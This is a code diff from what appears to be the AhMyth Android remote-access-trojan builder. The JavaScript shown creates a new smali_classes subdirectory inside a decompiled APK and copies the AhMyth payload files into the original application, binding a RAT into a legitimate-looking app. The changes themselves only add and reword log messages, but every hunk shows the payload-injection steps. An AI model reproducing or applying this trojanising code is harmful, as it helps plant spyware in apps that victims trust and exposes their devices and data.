@@ -104,7 +104,9 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
         return;
         
     } else {
-    
+        
+        console.log("Sorting the List of Smali Subdirectories...");
+        console.log();
         var ignoreDirs = ['original', 'res', 'build', 'kotlin'];
         var smaliList = files
             .filter((item) => item.isDirectory() +
@@ -114,14 +116,16 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
         smaliList.sort((a, b) => collator.compare(a, b));
         var lastSmali = smaliList[smaliList.length -1];
         if (lastSmali == "smali") {
+            console.log("Creating the new Smali Payload Subdirectory...");
+            console.log();
             fs.mkdir(apkFolder + '/smali_classes2', { recursive: true }, (error) => {
                 if (error) {
-                    console.log("Unable to create the smali payload directory");
+                    console.log("Unable to Create the Smali Payloload Subdirectory!");
                     console.log();
                     return;
                 };
                 
-                console.log("Copying AhMyth Payload Files to Original App...");
+                console.log("Copying AhMyth Payload Files to Original Application...");
                 console.log();
                 fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => { 
                     if (error) {
@@ -140,14 +144,16 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
             var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
             var newSmaliNumber = lastSmaliNumber+1;
             var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
+            console.log("Creating the new Smali Payload Subdirectory...");
+            console.log();
             fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                 if (error) {
-                    console.log("Unable to create the smali Payload Directory");
+                    console.log("Unable to Create the Smali Payload Subdirectory!");
                     console.log();
                     return;
                 };
                 
-                console.log("Copying AhMyth Payload Files to Original App...");
+                console.log("Copying AhMyth Payload Files to Original Application...");
                 console.log();
                 fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
                     if (error) {
